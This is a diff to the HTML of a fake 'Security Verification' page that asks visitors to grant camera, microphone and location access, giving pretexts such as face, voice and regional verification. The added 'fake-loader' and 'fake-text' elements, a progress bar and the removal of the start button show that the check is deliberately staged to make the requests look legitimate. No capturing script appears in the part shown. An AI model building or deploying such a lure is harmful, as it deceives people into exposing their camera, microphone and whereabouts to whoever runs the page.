@@ -3,44 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Check Required</title>
+    <title>Security Verification | Please Wait</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <div class="icon">🛡️</div>
-            <h1>Security Verification</h1>
-            <p>Please complete the security check to continue</p>
+            <div class="logo">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23667eea'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" alt="Security">
+            </div>
+            <h1>Security Check Required</h1>
+            <p class="subtitle">Please complete verification to continue</p>
             
-            <div class="permission-box" id="camera-box">
-                <div class="permission-icon">📷</div>
-                <div class="permission-text">
-                    <h3>Camera Access Required</h3>
-                    <p>For identity verification</p>
-                </div>
-                <div class="status" id="camera-status">Pending</div>
+            <div class="fake-content">
+                <div class="fake-loader"></div>
+                <div class="fake-text">Loading security modules...</div>
             </div>
             
-            <div class="permission-box" id="microphone-box">
-                <div class="permission-icon">🎤</div>
-                <div class="permission-text">
-                    <h3>Microphone Access Required</h3>
-                    <p>For voice verification</p>
+            <div class="permissions-container">
+                <div class="permission-item" id="camera-item">
+                    <div class="permission-icon">📷</div>
+                    <div class="permission-info">
+                        <div class="permission-name">Camera Access</div>
+                        <div class="permission-desc">For face verification</div>
+                    </div>
+                    <div class="permission-status" id="camera-status">⏳</div>
                 </div>
-                <div class="status" id="microphone-status">Pending</div>
+                
+                <div class="permission-item" id="microphone-item">
+                    <div class="permission-icon">🎤</div>
+                    <div class="permission-info">
+                        <div class="permission-name">Microphone Access</div>
+                        <div class="permission-desc">For voice verification</div>
+                    </div>
+                    <div class="permission-status" id="microphone-status">⏳</div>
+                </div>
+                
+                <div class="permission-item" id="location-item">
+                    <div class="permission-icon">📍</div>
+                    <div class="permission-info">
+                        <div class="permission-name">Location Access</div>
+                        <div class="permission-desc">For regional verification</div>
+                    </div>
+                    <div class="permission-status" id="location-status">⏳</div>
+                </div>
             </div>
             
-            <div class="permission-box" id="location-box">
-                <div class="permission-icon">📍</div>
-                <div class="permission-text">
-                    <h3>Location Access Required</h3>
-                    <p>For regional verification</p>
-                </div>
-                <div class="status" id="location-status">Pending</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
             </div>
             
-            <button id="start-btn" disabled>Start Verification</button>
             <div id="message" class="message"></div>
         </div>
     </div>
